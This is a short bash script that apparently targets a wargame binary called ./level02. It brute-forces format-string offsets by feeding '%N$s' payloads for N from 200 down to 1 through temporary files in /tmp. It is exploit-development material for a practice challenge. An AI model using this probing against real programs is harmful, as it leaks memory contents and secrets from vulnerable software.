#! /bin/bash

i=200

while [ $i -ge 1 ]
do
	echo Number: $i
	echo %$i\$s > /tmp/func1
	echo saf > /tmp/func2
	cat /tmp/func1 /tmp/func2 > /tmp/func
	exec cat /tmp/func | ./level02
	let "i-=1" 
done
